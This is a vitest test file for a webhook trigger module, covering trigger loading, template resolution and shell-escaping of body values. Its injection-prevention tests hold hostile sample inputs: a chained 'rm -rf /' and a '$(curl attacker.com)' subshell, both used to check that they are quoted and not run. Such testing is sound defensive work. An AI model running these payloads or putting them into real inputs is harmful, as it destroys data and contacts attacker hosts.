import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

vi.mock('fs', () => ({
  default: {
    existsSync: vi.fn(() => false),
    readFileSync: vi.fn(),
  },
}));
vi.mock('./actions.js', () => ({
  executeAction: vi.fn(),
}));

const { loadTriggers } = await import('./triggers.js');
const fs = (await import('fs')).default;
const { executeAction } = await import('./actions.js');

beforeEach(() => {
  vi.clearAllMocks();
  vi.spyOn(console, 'log').mockImplementation(() => {});
  vi.spyOn(console, 'error').mockImplementation(() => {});
});

afterEach(() => {
  vi.restoreAllMocks();
});

// Flush microtask queue — deterministic, no setTimeout race
const flush = () => new Promise(r => process.nextTick(r));

function stubTriggers(triggers) {
  fs.existsSync.mockReturnValue(true);
  fs.readFileSync.mockReturnValue(JSON.stringify(triggers));
  executeAction.mockResolvedValue('ok');
  return loadTriggers();
}

describe('loadTriggers', () => {
  it('returns empty triggerMap and no-op fireTriggers when file missing', async () => {
    fs.existsSync.mockReturnValue(false);
    const { triggerMap, fireTriggers } = loadTriggers();
    expect(triggerMap.size).toBe(0);
    fireTriggers('/webhook', {});
    await flush();
    expect(executeAction).not.toHaveBeenCalled();
  });

  it('loads triggers grouped by watch_path', () => {
    const { triggerMap } = stubTriggers([
      { name: 'T1', watch_path: '/webhook', actions: [{ type: 'command', command: 'echo 1' }] },
      { name: 'T2', watch_path: '/webhook', actions: [{ type: 'command', command: 'echo 2' }] },
      { name: 'T3', watch_path: '/github/webhook', actions: [{ type: 'agent', job: 'review' }] },
    ]);
    expect(triggerMap.get('/webhook')).toHaveLength(2);
    expect(triggerMap.get('/github/webhook')).toHaveLength(1);
  });

  it('skips disabled triggers', () => {
    const { triggerMap } = stubTriggers([
      { name: 'Active', watch_path: '/hook', actions: [], enabled: true },
      { name: 'Disabled', watch_path: '/hook', actions: [], enabled: false },
    ]);
    expect(triggerMap.get('/hook')).toHaveLength(1);
    expect(triggerMap.get('/hook')[0].name).toBe('Active');
  });

  it('returns empty map for empty array', () => {
    const { triggerMap } = stubTriggers([]);
    expect(triggerMap.size).toBe(0);
  });
});

describe('fireTriggers', () => {
  it('calls executeAction for matching path triggers', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'OnWebhook', watch_path: '/webhook',
      actions: [{ type: 'command', command: 'echo {{body.event}}' }],
    }]);
    fireTriggers('/webhook', { event: 'push' }, {}, {});
    await flush();
    expect(executeAction).toHaveBeenCalledTimes(1);
  });

  it('does not call executeAction for non-matching path', async () => {
    const { fireTriggers } = stubTriggers([
      { name: 'T1', watch_path: '/webhook', actions: [{ type: 'command', command: 'echo' }] },
    ]);
    fireTriggers('/other-path', {});
    await flush();
    expect(executeAction).not.toHaveBeenCalled();
  });

  it('shell-escapes {{body.field}} in command templates (single-quote wrapping)', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'ShellEscape', watch_path: '/hook',
      actions: [{ type: 'command', command: 'deploy {{body.branch}}' }],
    }]);
    fireTriggers('/hook', { branch: 'main' });
    await flush();
    // shellQuote wraps in single quotes: deploy 'main'
    expect(executeAction.mock.calls[0][0].command).toBe("deploy 'main'");
  });

  it('shell-escapes single quotes in body values (injection prevention)', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'Injection', watch_path: '/hook',
      actions: [{ type: 'command', command: 'echo {{body.input}}' }],
    }]);
    fireTriggers('/hook', { input: "O'Reilly; rm -rf /" });
    await flush();
    // shellQuote: 'O'\''Reilly; rm -rf /'
    expect(executeAction.mock.calls[0][0].command).toBe("echo 'O'\\''Reilly; rm -rf /'");
  });

  it('strips null bytes from shell-escaped values', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'NullByte', watch_path: '/hook',
      actions: [{ type: 'command', command: 'echo {{body.val}}' }],
    }]);
    fireTriggers('/hook', { val: 'before\0after' });
    await flush();
    expect(executeAction.mock.calls[0][0].command).toBe("echo 'beforeafter'");
  });

  it('shell-escapes backtick and $() subshell attempts', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'Subshell', watch_path: '/hook',
      actions: [{ type: 'command', command: 'echo {{body.val}}' }],
    }]);
    fireTriggers('/hook', { val: '$(curl attacker.com)' });
    await flush();
    // Single-quoted: subshell not interpreted
    expect(executeAction.mock.calls[0][0].command).toBe("echo '$(curl attacker.com)'");
  });

  it('does NOT shell-escape job templates (only commands)', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'Job', watch_path: '/hook',
      actions: [{ type: 'agent', job: 'Process: {{body}}' }],
    }]);
    fireTriggers('/hook', { key: 'value' });
    await flush();
    const job = executeAction.mock.calls[0][0].job;
    // Job templates resolve without shell escaping — JSON stringified
    expect(job).toContain('"key"');
    expect(job).toContain('"value"');
    expect(job).not.toContain("'"); // no single-quote wrapping
  });

  it('preserves unresolvable template placeholders', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'Unknown', watch_path: '/hook',
      actions: [{ type: 'agent', job: 'Do: {{unknown.field}}' }],
    }]);
    fireTriggers('/hook', {});
    await flush();
    expect(executeAction.mock.calls[0][0].job).toBe('Do: {{unknown.field}}');
  });

  it('resolves {{query.param}} templates', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'Query', watch_path: '/hook',
      actions: [{ type: 'agent', job: 'Search: {{query.q}}' }],
    }]);
    fireTriggers('/hook', {}, { q: 'test query' });
    await flush();
    expect(executeAction.mock.calls[0][0].job).toBe('Search: test query');
  });

  it('resolves {{headers.field}} templates (word-char keys only)', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'Header', watch_path: '/hook',
      actions: [{ type: 'agent', job: 'From: {{headers.origin}}' }],
    }]);
    fireTriggers('/hook', {}, {}, { origin: 'github' });
    await flush();
    expect(executeAction.mock.calls[0][0].job).toBe('From: github');
  });

  it('does NOT resolve hyphenated header names (regex \\w limitation)', async () => {
    const { fireTriggers } = stubTriggers([{
      name: 'Hyphen', watch_path: '/hook',
      actions: [{ type: 'agent', job: '{{headers.x-source}}' }],
    }]);
    fireTriggers('/hook', {}, {}, { 'x-source': 'github' });
    await flush();
    // \w doesn't match hyphens — placeholder left intact
    expect(executeAction.mock.calls[0][0].job).toBe('{{headers.x-source}}');
  });
});
